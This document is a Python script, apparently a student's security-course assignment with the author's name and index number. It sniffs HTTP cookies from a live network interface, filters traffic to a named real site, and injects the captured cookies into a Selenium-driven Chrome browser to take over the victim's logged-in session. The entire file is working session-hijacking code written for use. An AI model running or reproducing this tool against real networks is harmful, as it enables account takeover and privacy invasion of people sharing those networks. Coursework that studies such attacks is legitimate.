#Radoslaw Wojtczak nr indeksu: 254607
#Bezpieczenstwo lista 2 zadanie 2

#Potrzebne importy
import pyshark
import time
from selenium import webdriver
import sys
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

USER_AGENT="selenium"


# website : cookies
websites=["matma4u.pl"]


# Adds the cookie into current browser context
#driver.add_cookie({"name": "key", "value": "value"})
# należy lekko zmodyfikować otrzymane cookie
# aby dopasowały się do wzorca ze strony 
def parser(cookies):
    arr=[]
    for cookie in cookies.split('; '):
        arr.append({"name":cookie.split('=')[0],"value":cookie.split("=")[1]})    
    return arr

def sniff(interface):
    session = pyshark.LiveCapture(interface=interface, display_filter="http.cookie")
    for packet in session.sniff_continuously():
        if(packet.http.user_agent == USER_AGENT):
            continue
        if (packet.http.host in websites):
            cookies=parser(packet.http.cookie)
            if(cookies):
                opts = Options()
                user="user-agent="+USER_AGENT
                opts.add_argument(user)

                driver = webdriver.Chrome(options=opts)
                driver.get("http://" + packet.http.host + packet.http.request_uri)
                print("Obecne ciastka przegladarki: ")
                currentCookies=driver.get_cookies()
                print(cookies)
                #for cookie in cookies:
                    #print(cookie)
                    #driver.add_cookie(cookie)
                for cookie in currentCookies:
                    driver.delete_cookie(cookie["name"])
                for cookie in cookies:
                    driver.add_cookie(cookie)
                driver.refresh()
def main():
    try:
        arg = sys.argv[1]
        sniff(arg)
    except IndexError:
        print("Add interface after space")
        print("Example: python sniff.py enp0s3")

if __name__ == "__main__": 
    main()